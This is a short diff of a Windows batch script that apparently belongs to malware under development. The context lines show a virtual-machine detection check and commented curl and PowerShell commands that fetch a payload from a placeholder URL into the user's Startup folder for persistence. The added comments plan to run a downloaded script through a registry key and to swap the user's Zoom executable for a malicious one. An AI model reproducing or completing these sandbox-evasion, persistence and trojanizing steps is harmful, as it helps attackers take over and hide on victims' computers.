@@ -83,6 +83,13 @@ echo [NOT DETECTED] This system does not exhibit common virtual machine characte
 ::        curl.exe -kL <urltopayload> -o %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat
 ::        powershell.exe -c Invoke-WebRequest -uri <urltopayload> -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat"
 
+::    Download script to Temp and execute with Registry Key
+
+::    ZoomUpdate EXE change
+::        Check if Zoom is in user profile
+::        change name of zoom exe
+::        Download malicious Zoom exe to folder
+
 :end
 pause
 endlocal
